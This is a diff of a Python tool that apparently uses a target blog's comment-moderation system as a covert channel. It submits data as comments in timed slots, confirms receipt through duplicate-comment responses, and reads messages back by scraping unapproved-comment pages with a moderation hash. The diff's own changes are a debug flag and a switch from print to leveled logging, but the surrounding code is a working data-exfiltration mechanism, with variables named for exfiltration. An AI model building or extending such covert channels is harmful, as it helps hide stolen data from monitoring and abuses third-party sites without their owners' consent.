@@ -5,6 +5,11 @@ import random
 import string
 import hmac
 import urllib.parse
+import tools
+import sys
+tools.is_debug = True if len(sys.argv) > 2 and sys.argv[2] == "-v" else False
+from tools import *
+
 from bs4 import BeautifulSoup
 
 class SendConfig:
@@ -103,7 +108,7 @@ def delay_to_timeslot(time_slot):
     target_date = get_next_timeslot_date(current_date, time_slot)
 
     time_diff = target_date - current_date
-    print("[INFO] Delaying until " + str(target_date) + ": " + str(time_diff.seconds) + "." + str(time_diff.microseconds) + " or ~" + str(time_diff.seconds/60) + " mins")
+    log_print("[INFO] Delaying until " + str(target_date) + ": " + str(time_diff.seconds) + "." + str(time_diff.microseconds) + " or ~" + str(time_diff.seconds/60) + " mins", 2)
 
     time.sleep(time_diff.seconds + (time_diff.microseconds / 1000000))
 
@@ -181,14 +186,14 @@ def send_data(channel, data, send_config):
     while True:
         delay_to_timeslot(send_config.send_time_slot)
 
-        print("[INFO] send_data: Sending data " + str(data.message_id) + " at " + str(datetime.datetime.now().time()))
+        log_print("[INFO] send_data: Sending data " + str(data.message_id) + " at " + str(datetime.datetime.now().time()), 2)
 
         response = submit_comment(channel.target_blog, channel.exfil_channel_id, data.message)
         if response.html_response_code == 409:
-            print("## " + str(response.html_response))
-            print("## " + str(data.message_id) + ", " + str(data.message))
+            log_print("## " + str(response.html_response))
+            log_print("## " + str(data.message_id) + ", " + str(data.message))
             
-        print("## send_data: " + str(response.html_response_code) + ", " + str(response.url) + ", " + str(response.moderation_hash))
+        log_print("## send_data: " + str(response.html_response_code) + ", " + str(response.url) + ", " + str(response.moderation_hash), 2)
 
         if send_config.confirm_time_slot:
             delay_to_timeslot(send_config.confirm_time_slot)
@@ -196,10 +201,10 @@ def send_data(channel, data, send_config):
             response = response = submit_comment(channel.target_blog, channel.ack_channel_id, data.message_id)
             if "Duplicate" in response.html_response:
                 # If it's duplicated, that means that the server successfully got the message.
-                print("[INFO] send_data: Message submitted and confirmed.")
+                log_print("[INFO] send_data: Message submitted and confirmed.", 1)
                 break
             else:
-                print("[INFO + " + str(datetime.datetime.utcnow()) + " ] send_data: Message was not received by server. Resending...")
+                log_print("[INFO + " + str(datetime.datetime.utcnow()) + " ] send_data: Message was not received by server. Resending...", 1)
         else:
             break
 
@@ -219,12 +224,12 @@ def get_moderation_hash_at_current_time(channel):
 def receive_data(channel, num_of_receivers, recv_config):
     received_data = []
     
-    print("[INFO] receive_data: Delaying to receive timeslot. " + str(recv_config.recv_time_slot))
+    log_print("[INFO] receive_data: Delaying to receive timeslot. " + str(recv_config.recv_time_slot), 2)
     delay_to_timeslot(recv_config.recv_time_slot)
     current_hash, server_index = get_moderation_hash_at_current_time(channel)
 
-    print("[INFO] receive_data: Current hash is: " + current_hash)
-    print("[INFO] receive_data: Delaying to process timeslot. " + str(recv_config.process_time_slot))
+    log_print("[INFO] receive_data: Current hash is: " + current_hash, 2)
+    log_print("[INFO] receive_data: Delaying to process timeslot. " + str(recv_config.process_time_slot), 2)
 
     delay_to_timeslot(recv_config.process_time_slot)
 
@@ -242,7 +247,7 @@ def receive_data(channel, num_of_receivers, recv_config):
                 continue
             
             url = channel.target_blog + channel.exfil_channel + "?unapproved=" + str(current_unapproved_index) + "&moderation-hash=" + current_hash + "&url=" + str(current_unapproved_index)
-            print("[INFO] receive_data: Checking URL: " + url);
+            log_print("[INFO] receive_data: Checking URL: " + url, 2);
 
             response_html = fetch_comments_page(url)
             soup = BeautifulSoup(response_html, "html.parser")
@@ -255,12 +260,12 @@ def receive_data(channel, num_of_receivers, recv_config):
                     exfil_content = str(elem.string).strip()
                     received_data.append(exfil_content)
 
-                    print("[INFO] receive_data: Received content " + str(exfil_content) + " using index " + str(current_unapproved_index))
+                    log_print("[INFO] receive_data: Received content " + str(exfil_content) + " using index " + str(current_unapproved_index), 1)
 
                     processed_unapproved_indexes.append(current_unapproved_index)
                     break
             else:
-                print("[INFO] receive_data: No comment for moderation for " + str(recv_config.recv_time_slot) + " using index " + str(current_unapproved_index) + ". Skipping...")
+                log_print("[INFO] receive_data: No comment for moderation for " + str(recv_config.recv_time_slot) + " using index " + str(current_unapproved_index) + ". Skipping...", 2)
                 
         index_client += 1                    
 
